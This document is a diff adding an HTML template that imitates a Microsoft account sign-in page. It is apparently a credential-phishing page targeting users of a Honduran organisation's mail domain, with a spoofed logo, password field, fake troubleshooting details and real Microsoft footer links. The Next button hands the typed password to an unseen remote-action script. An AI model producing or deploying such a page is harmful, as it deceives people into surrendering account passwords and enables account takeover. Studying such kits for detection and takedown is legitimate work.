@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script src="{{ url_for('static', filename='actions.js') }}" defer></script>
+    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMyAyMyI+PHBhdGggZmlsbD0iI2YyNTAyMiIgZD0iTTAgMGgxMXYxMUgweiIvPjxwYXRoIGZpbGw9IiM3ZmJiMDAiIGQ9Ik0xMiAwaDExdjExSDEyeiIvPjxwYXRoIGZpbGw9IiMwMGE0ZWYiIGQ9Ik0wIDEyaDExdjExSDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyIDEyaDExdjExSDEyeiIvPjwvc3ZnPg==">
+</head>
+<html>
+<body>
+    <div id="overlay" class="overlay"></div>
+    
+    <div class="outer">
+        <div class="middle">
+            <div class="sign-in-box">
+                <div class="win-scroll">
+                    <div class="logo">
+                        <img id="logo_image" class="logo_image" src="" alt="Logo">
+                    </div>
+                    <div id="display_name" class="display_name">
+                        username@domain.com
+                    </div>
+                    <div class="prompt">
+                        Enter password
+                    </div>
+                    <div id="error" style="display:none; color:red; font-size:0.8125rem; margin-bottom:10px;">
+                        Please enter the password for your Microsoft account.
+                    </div>
+                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password">
+                </div>
+                
+                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
+                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
+                
+                <div class="buttoncontainer">
+                    <input type="button" id="submit" class="button" value="Next" onclick="clickActionRemote()">
+                </div>
+
+                <div id="idBoilerPlateText" class="boilerplate-box">
+                    <p>Recuerda si tienes problemas con tu cuenta de correo, ingresa a https://mail.coacehl.hn/RecursosApoyo o escribenos a soportecorreo@coacehl.hn.</p>
+                </div>
+            </div> 
+            
+
+            <div id="troubleshoot-section" class="sign-in-box troubleshoot-container" style="display:none; margin-top: 10px; padding-top: 20px !important; padding-bottom: 20px !important;">
+    <div style="display: flex; justify-content: space-between; align-items: flex-start; line-height: 1;">
+    <p style="margin: 0; padding-top: 5px;"><strong>Troubleshooting details</strong></p>
+    <span style="cursor: pointer; font-size: 2rem; font-weight: 100; color: #666; line-height: 0.8; margin-top: -5px;" onclick="toggleTroubleshoot()">&times;</span>
+</div>
+
+<p style="font-size: 13px; margin: 5px 0 8px 0;">If you contact your administrator, send this info to them.</p>
+
+<div style="margin-bottom: 5px;">
+    <button class="copy-btn" onclick="copyTroubleshoot()">Copy info to clipboard</button>
+    <span id="copy-status" style="display:none; font-size: 12px; margin-left: 10px;"></span>
+</div>
+
+    <div class="debug-info" style="margin: 10px 0; padding: 10px;">
+        <p>Error Code: 16000</p>
+        <p>Request Id: 756acfe5-ae8e-438a-bc0b-f62fd5130b00</p>
+        <p>Correlation Id: 6f4f1763-7f3a-37fd-a0c1-e33a92cc4b21</p>
+        <p>Timestamp: 2026-02-27T19:54:22.801Z</p>
+    </div>
+
+    <div class="flag-section" style="margin-top: 10px; padding-top: 5px;">
+        <p style="margin:0;"><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
+        <p style="font-size: 14px; margin-top: 5px;">If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
+    </div>
+         </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footertext">
+            <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
+            <a href="https://www.microsoft.com/en-US/privacy/privacystatement">Privacy & Cookies</a>
+            <span class="ellipsis-btn" onclick="toggleTroubleshoot() ">. . .</span>
+        </div>
+    </div>
+</body>
+</html>
